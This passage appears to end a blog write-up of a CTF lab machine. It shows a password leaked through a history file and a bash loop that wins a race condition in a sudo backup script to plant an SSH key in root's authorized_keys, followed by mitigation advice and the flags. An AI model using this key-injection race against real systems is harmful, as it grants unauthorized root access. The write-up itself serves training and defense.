fa-clipboard"></i></button></div><div class="highlight"><code>ssh pixel@dev01trunm90874RR </code></div></div><p>It’s almost like the user was trying to login to the <code class="language-plaintext highlighter-rouge">pixel</code> account on dev01, and “accidentally” pasted the password in the terminal instead.</p><p>Using this password <code class="language-plaintext highlighter-rouge">trunm90874RR</code>, we can login to the pixel account on dev01 from www-data.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-42.png" alt="" /></p><p>We can now read /home/pixel/local.txt, for the third flag.</p><h3 id="privilege-escalation-1">Privilege Escalation</h3><p>Generally speaking on boot2root machines, if you have a user’s password and are trying to privesc, the first thing you should check is sudoers.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-43.png" alt="" /></p><p>This allows us to execute the script as root, without even needing a password.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-44.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">/opt/back.sh</code> seems a custom created script, and the <code class="language-plaintext highlighter-rouge">pixel</code> user only has the read permission set.</p><p>When reading this file however, it seems oddly familiar somehow…</p><p>Due to my lack of social life, I recognised this file from the HTB machine Tenet, which I completed a few months ago. It essentially exploits a race condition in bash, so that we can overwrite a temporary file, while the root <code class="language-plaintext highlighter-rouge">/opt/back.sh</code> is using it.</p><p>https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#shell-as-root</p><p>I’ll let the notorious 0xdf explain this one in greater depth, as it seems only fair considering I used his script.</p><p>It’s worth noting there are one or two slight changes in the new script:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nv">mystiko</span><span class="o">=</span><span class="si">$(</span>/usr/bin/mktemp <span class="nt">-u</span> /tmp/mystiko-XXXXXX<span class="si">)</span> /usr/bin/touch <span class="nv">$mystiko</span><span class="p">;</span>/usr/bin/chmod 777 <span class="nv">$mystiko</span> /usr/bin/echo <span class="s2">"backup root public key...."</span> /usr/bin/echo <span class="s2">"[normal key]"</span> <span class="o">&gt;</span> <span class="nv">$mystiko</span> /usr/bin/cat <span class="nv">$mystiko</span> <span class="o">&gt;</span> /root/.ssh/authorized_keys /usr/bin/sleep 1 /usr/bin/echo <span class="s2">"backup done."</span> /usr/bin/rm <span class="nv">$mystiko</span> </code></div></div><p>So we will adapt the exploit script to overwrite all temporary files by the name of <code class="language-plaintext highlighter-rouge">/tmp/mystiko-*</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do for </span>file <span class="k">in</span> /tmp/mystiko-<span class="k">*</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"[public key from 1st machine: /root/.ssh/id_rsa.pub]"</span> <span class="o">&gt;</span> <span class="nv">$file</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span> </code></div></div><p>Running the above bash script from a separate terminal, when we execute <code class="language-plaintext highlighter-rouge">sudo /opt/back.sh</code>, our public key gets inserted instead of the default key.</p><p>This allows the <code class="language-plaintext highlighter-rouge">root</code> user on the first machine to SSH into <code class="language-plaintext highlighter-rouge">dev01</code> without need of a password.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-45.png" alt="" /></p><p>From here, all we need to do is read the flag in <code class="language-plaintext highlighter-rouge">/root/proof.txt</code> to finish the machine.</p><h3 id="vulnerability-mitigations-1">Vulnerability Mitigations</h3><h4 id="foothold-1">Foothold</h4><p>The best advice to fix the code injection vulnerability is to remove the <code class="language-plaintext highlighter-rouge">shell_exec</code> function with the user input completely.</p><p>Instead, try something similar to:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span text-data=" PHP "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nv">$myfile</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"test.txt"</span><span class="p">,</span> <span class="s2">"a+"</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span> <span class="nv">$file_name</span><span class="p">);</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span> </code></div></div><p>This should have exactly the same effect as the previous <code class="language-plaintext highlighter-rouge">shell_exec</code> function.</p><p>It is also worth noting the the filename, filetype and file size are reflected back to us improperly. This means we can inject arbitrary HTML code in either of the variables, and achieve Cross-site scripting (XSS).</p><p>To prevent this, the server should use the <code class="language-plaintext highlighter-rouge">htmlspecialchars()</code> function any any user supplied input.</p><h4 id="lateral-movement-1">Lateral Movement</h4><p>To prevent attacks gleaming sensitive information from the history files, you can link them to /dev/null, so no commands are stored.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nb">ln</span> <span class="nt">-sf</span> /dev/null /root/.bash_history </code></div></div><p>Additionally, it is recommended all users regularly update their passwords. <br /> It was noted in /etc/login.defs, that the password expiration policy date was set to 99999 days, so the passwords would virtually never have to be reset.</p><h4 id="privesc-1">Privesc</h4><p>Once again, it is questioned whether the user should have the sudo permissions on the backup file. <br /> To prevent a race condition, the line <code class="language-plaintext highlighter-rouge">chmod 777 $mystiko</code> should be removed.<br /> This would only allow the bash script to write to the temporary file, and would prevent exploitation in the manner previously described.</p><h2 id="flags">Flags</h2><h3 id="pixel">Pixel</h3><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-46.png" alt="" /></p><h3 id="dev01">Dev01</h3><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-47.png" alt="" /></p><ul><li>mystikoctf{8377e3e0acca54f1da34e40f028fabe5}<li>mystikoctf{3e3ed005320d4c091009e1d235fc9656}<li>mystikoctf{8c1b2bfba98e077b3ae19a30f52cb1df}<li>mystikoctf{8e805100ea1837d41032a796fc179020}</ul><p><br /></p><h2 id="conclusion">Conclusion</h2><p>Thanks for making it to the end of this writeup.</p><p>I was fortunate enough to win the CTF, and consequently win the OSCP voucher.<br /> So if you read through this writeup, and understood all the content, you too could win an OSCP voucher!</p><p>I’m currently working on a post to help beginners get started learning hacking for free (it can’t get more clickbaity than this right), and hopefully I should cover some tactics for winning these CTFs that aren’t just “Get Good”</p><p>As you can see from the below screenshot, there were only <strong>5</strong> competitors so if this doesn’t prove this was 99% luck I don’t know what will.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-48.png" alt="" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/linux/'>Linux</a>, <a href='/categories/ctf/'>CTF</a>, <a href='/categories/privilege-escalation/'>Privilege Escalation</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a> <a href="/tags/oscp/" class="post-tag no-text-decoration" >oscp</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=MystikoCTF Writeup - Freddie&url=/posts/mystiko-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=MystikoCTF Writeup - Freddie&u=/posts/mystiko-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=MystikoCTF Writeup - Freddie&url=/posts/mystiko-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/mystiko-writeup/">MystikoCTF Writeup</a><li><a href="/posts/resources/">Cyber Resources</a><li><a href="/posts/strace-keylogger/">Strace - Bash Keylogger</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/offensive/">offensive</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/resources/">resources</a> <a class="post-tag" href="/tags/tools/">tools</a> <a class="post-tag" href="/tags/writeups/">writeups</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/strace-keylogger/"><div class="card-body"> <span class="timeago small" >Nov 17, 2021<i class="unloaded">2021-11-17T08:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Strace - Bash Keylogger</h3><div class="text-muted small"><p> by Freddie Introduction System calls are used by processes to interact with the kernel. For example if a process wants to read or write to a file...</p></div></div></a></div><div class="card"> <a href="/posts/resources/"><div class="card-body"> <span class="timeago small" >Jan 1, 2000<i class="unloaded">2000-01-01T08:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cyber Resources</h3><div class="text-muted small"><p> Cyber Resources by Freddie This is a collection of all the best resources I’ve learnt from and used in the past year of my cyber security learning....</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/strace-keylogger/" class="btn btn-outline-primary" prompt="Older"><p>Strace - Bash Keylogger</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = '/posts/mystiko-writeup/'; this.page.identifier = '/posts/mystiko-writeup/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://https-fredd-ie.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (modeToggle !== null) { modeToggle.addEventListener('click', reloadDisqus); window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/freddie0x1">Freddie</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/offensive/">offensive</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/resources/">resources</a> <a class="post-tag" href="/tags/tools/">tools</a> <a class="post-tag" href="/tags/writeups/">writeups</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
